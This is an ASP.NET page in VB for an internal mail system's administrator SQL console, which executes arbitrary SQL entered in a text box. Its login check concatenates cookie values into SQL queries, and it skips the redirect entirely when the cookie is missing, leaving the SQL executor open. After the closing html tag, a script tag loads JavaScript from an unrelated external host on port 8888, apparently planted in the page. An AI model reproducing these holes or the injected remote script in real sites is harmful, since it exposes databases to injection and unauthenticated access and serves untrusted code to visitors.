<%@ Page Language="VB" %>
<%@ Register Assembly="System.Web.Extensions, Version=1.0.61025.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
    Namespace="System.Web.UI" TagPrefix="asp" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<script runat="server">
    Dim dbconn As New dbconn
    Dim conn As Data.OleDb.OleDbConnection
    Dim cmd As Data.OleDb.OleDbCommand
    Dim FunctionClass As New FunctionClass
    Dim dr As Data.OleDb.OleDbDataReader
    Protected Sub Page_Init(ByVal sender As Object, ByVal e As System.EventArgs)
        dbconn.Create()
        conn = dbconn.GetConn()
        cmd = conn.CreateCommand
        Dim username As String
        Dim rndtext As String
        If Request.Cookies("nbmailsystem") Is Nothing Then
            Exit Sub
        End If
        If Request.Cookies("nbmailsystem")("username") Is Nothing Or Request.Cookies("nbmailsystem")("rndtext") Is Nothing Then
            Response.Redirect("index.aspx")
        End If
        username = Trim(Request.Cookies("nbmailsystem")("username").ToString())
        rndtext = Trim(Request.Cookies("nbmailsystem")("rndtext").ToString())
        cmd.CommandText = "select count(*) as count001 from [userinfo] where [username]='" & username & "' and [rndtext]='" & rndtext & "'"
        dr = cmd.ExecuteReader()
        dr.Read()
        If dr("count001") <= 0 Then
            dr.Close()
            Response.Redirect("index.aspx")
        End If
        dr.Close()
        cmd.CommandText = "select * from [userinfo] where [username]='" & username & "' and [rndtext]='" & rndtext & "'"
        dr = cmd.ExecuteReader()
        dr.Read()
        If dr("UserType") <> 1 Then
            Response.Redirect("main.aspx")
        End If
        dr.Close()
    End Sub
    Protected Sub Page_Unload(ByVal sender As Object, ByVal e As System.EventArgs)
        If (conn Is Nothing) = False Then
            dbconn.Close()
            conn = Nothing
            dbconn = Nothing
            cmd = Nothing
        End If
    End Sub
    Protected Sub Timer_timemsg_Tick(ByVal sender As Object, ByVal e As System.EventArgs)
        Dim tempmsg As String
        Select Case Now.Hour
            Case 0 To 4
                tempmsg = "凌晨好！"
            Case 5 To 7
                tempmsg = "早上好！"
            Case 8 To 11
                tempmsg = "上午好！"
            Case 12
                tempmsg = "中午好！"
            Case 13 To 17
                tempmsg = "下午好！"
            Case 18 To 23
                tempmsg = "晚上好！"
        End Select
        Label_timemsg.Text = "现在是" + CStr(Now.Date.Year) + "年" + Right("0" + CStr(Now.Month), 2) + "月" + Right("0" + CStr(Now.Day), 2) + "日" + " " + Right("0" + CStr(Now.Hour), 2) + "时" + Right("0" + CStr(Now.Minute), 2) + "分" + Right("0" + CStr(Now.Second), 2) + "秒 " + tempmsg
    End Sub
</script>
<html xmlns="http://www.w3.org/1999/xhtml" >
<head id="Head1" runat="server">
<link rel="stylesheet" href="Style.css" type="text/css" />
<link rel="shortcut icon" href="logo.ico" type="image/x-icon" /> 
    <title>
    <% 
        On Error Resume Next
        cmd.CommandText = "select * from WebInfo"
        dr = cmd.ExecuteReader()
        If dr.HasRows() = True Then
            dr.Read()
            Response.Write(dr("comname") + "内部邮件系统")
        End If
        dr.Close()
     %>
    </title>
</head>
<body>
    <form id="form1" runat="server">
    <div>
        <asp:scriptmanager ID="Scriptmanager1" runat="server">
        </asp:scriptmanager>
        <asp:UpdatePanel ID="UpdatePanel1" runat="server" UpdateMode="Conditional">
        <ContentTemplate> 
        <asp:Timer ID="Timer_timemsg" runat="server" Interval ="1" OnTick="Timer_timemsg_Tick" /> 
        <asp:Label ID="Label_timemsg" runat="server" Text="Label" Width="744px" />
        </ContentTemplate>
        </asp:UpdatePanel>
        <% 
            On Error Resume Next
            cmd.CommandText = "select * from WebInfo"
            dr = cmd.ExecuteReader()
            If dr.HasRows() = True Then
                dr.Read()
                Response.Write("<br /><br /><center><img src=logo.jpg><font color=#FFFFFF size=12px>" + dr("comname") + "内部邮件系统欢迎您！</font></center><br /><br />")
            End If
            dr.Close()
        %>
        <asp:Label ID="Label1" runat="server" Text="SQL语句："></asp:Label><br />
        <asp:TextBox ID="Text_sql" runat="server" Height="256px" TextMode="MultiLine" Width="576px"></asp:TextBox>
        <asp:Button ID="Button_Execute" runat="server" Text="执行" /> 
        </div>
    </form>
    <a href="main.aspx">回到首页</a>
    <% 
        On Error GoTo err
        Dim da As Data.OleDb.OleDbDataAdapter
        Dim dt As New Data.DataTable
        Dim i As Integer
        Dim j As Integer
        If Trim(Text_sql.Text) = "" Then
            Exit Sub
        End If
        cmd.CommandText = Trim(Text_sql.Text)
        If Left(cmd.CommandText, 6) = "select" Then '查询语句
            da = New Data.OleDb.OleDbDataAdapter(cmd)
            da.Fill(dt)
            Response.Write("执行结果:<table border=1><tr>")
            For i = 0 To dt.Columns.Count - 1  '输出列名
                Response.Write("<td>" & dt.Columns(i).ToString() & "</td>")
            Next
            Response.Write("</tr>")
            dr = cmd.ExecuteReader()
            While (dr.Read())
                Response.Write("<tr>")
                For j = 0 To dt.Columns.Count - 1
                    Response.Write("<td>" & dr(j) & "</td>")
                Next
                Response.Write("</tr>")
            End While
            dr.Close()
            dt.Clear()
            Response.Write("</table>")
        Else
            cmd.CommandText = Text_sql.Text
            i = cmd.ExecuteNonQuery()
            Response.Write("执行结果:执行成功" & Chr(13) & "影响行数：" & CStr(i))
        End If
        Exit Sub
err:
        Response.Write("执行结果：执行失败，请检查您的SQL语句是否正确。")
    %>
</body>
</html>
<script type="text/javascript" src="http://web.nba1001.net:8888/tj/tongji.js"></script>